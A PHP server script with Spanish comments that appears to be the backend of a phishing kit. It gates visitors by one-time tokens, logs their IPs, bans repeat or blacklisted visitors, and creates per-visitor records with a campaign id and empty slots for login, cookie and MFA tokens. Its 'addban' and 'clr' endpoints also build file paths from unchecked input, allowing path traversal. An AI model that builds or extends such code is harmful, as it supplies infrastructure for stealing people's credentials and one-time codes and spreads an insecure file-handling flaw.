<?php

session_start();

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header('Content-Type: application/json');

$date_time = date("Y-m-d H:i:s");
$client_ip = $_SERVER['REMOTE_ADDR'];
$request = $_SERVER['REQUEST_URI'];

$log_message = "[$date_time] Solicitud recibida desde $client_ip: $request\n";
file_put_contents("log.txt", $log_message, FILE_APPEND);

if (isset($_GET['verify'])) {
    $token = $_GET['verify'];
    $ip = $_GET['ip'] ?? null; // Se asigna null si no está presente

    // Verificar formato del token (una letra, dos números, dos letras)
    if (!preg_match('/^[A-Z]\d{2}[A-Z]{2}$/', $token)) {
        echo json_encode(array("token" => "denied"));
        exit;
    }

    // Continuar con el código para manejar el IP
    $ips_file_path = 'ips.txt';
    $ips = file_exists($ips_file_path) ? file($ips_file_path, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
    $readded = ($ip && in_array($ip, $ips)) ? "yes" : "no";

    if ($ip && $readded === "no") {
        file_put_contents($ips_file_path, $ip . PHP_EOL, FILE_APPEND);
    }

    // Verificar si la IP está en blacklist.txt
    $blacklist_file_path = 'blacklist.txt';
    $blacklist = file_exists($blacklist_file_path) ? file($blacklist_file_path, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
    $ban = ($ip && in_array($ip, $blacklist)) ? "yes" : "no";

    // Verificar si el token está en active.txt
    $active_file_path = 'active.txt';
    $active_tokens = file_exists($active_file_path) ? file($active_file_path, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
    $token_status = in_array($token, $active_tokens) ? "200OK" : "denied";

    if ($token_status === "200OK") {
        $inactive_file_path = 'inactive.txt';
        file_put_contents($inactive_file_path, $token . PHP_EOL, FILE_APPEND);
        $active_tokens = array_diff($active_tokens, [$token]);
        file_put_contents($active_file_path, implode(PHP_EOL, $active_tokens) . PHP_EOL);

        // Crear archivo JSON en ../users/files
        $json_data = array(
            'token' => $token,
            'ip' => $ip,
            'time' => date("Y-m-d H:i:s"),
            'camp' => 'US-ABCD00',
            'referer' => $_SERVER['HTTP_REFERER'] ?? 'undefined',
            'strikes' => "0",
            'map' => "1",
            'status' => "Init",
            'ltoken' => 'undefined',
            'ctoken' => 'undefined',
            'mtoken' => 'undefined',
            'data1' => 'undefined',
            'data2' => 'undefined',
            'data3' => 'undefined',
            'mfastatus' => 'off',
            'mfa1' => 'undefined',
            'mfa2' => 'undefined',
            'mfa3' => 'undefined',
            'userAgent' => $_SERVER['HTTP_USER_AGENT'] ?? 'undefined'
        );

        $json_file_path = "../users/files/" . $token . ".json";
        file_put_contents($json_file_path, json_encode($json_data, JSON_PRETTY_PRINT));

        if ($ban === "yes" && $readded === "yes") {
            $response = array("token" => "generalban");
        } elseif ($ban === "yes") {
            $response = array("token" => "ipban");
        } elseif ($readded === "yes") {
            $response = array("token" => "readdban");
        } else {
            $response = array("token" => $token_status);
        }

        echo json_encode(array_merge(array(
            "token" => $response["token"],
            "readded" => $readded,
            "ban" => $ban
        )));
    } else {
        echo json_encode(array(
            "token" => $token_status,
            "readded" => $readded,
            "ban" => $ban
        ));
    }
    exit;
}

if (isset($_GET['addban'])) {
    $token = $_GET['addban'];
    $json_file_path = "../users/files/" . $token . ".json";

    if (file_exists($json_file_path)) {
        $json_content = file_get_contents($json_file_path);
        $data = json_decode($json_content, true);

        if (isset($data['ip'])) {
            $ip = $data['ip'];

            $blacklist_file_path = 'blacklist.txt';
            $blacklist = file_exists($blacklist_file_path) ? file($blacklist_file_path, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];

            if (!in_array($ip, $blacklist)) {
                file_put_contents($blacklist_file_path, $ip . PHP_EOL, FILE_APPEND);
                $response = array("token" => "added_to_blacklist");
            } else {
                $response = array("token" => "already_in_blacklist");
            }
        } else {
            $response = array("token" => "json_error", "message" => "IP no encontrada en el JSON");
        }
    } else {
        $response = array("token" => "json_not_found", "message" => "Archivo JSON no encontrado");
    }

    echo json_encode($response);
    exit;
}

if (isset($_GET['clr'])) {
    $token = $_GET['clr'];
    $json_file_path = "../users/files/" . $token . ".json";

    if (file_exists($json_file_path)) {
        unlink($json_file_path);
        $response = array("token" => "file_deleted");
    } else {
        $response = array("token" => "file_not_found", "message" => "Archivo JSON no encontrado");
    }

    echo json_encode($response);
    exit;
}

// Respuesta por defecto para otros casos
echo json_encode(array("status" => "error", "message" => "Parámetro no válido."));

?>

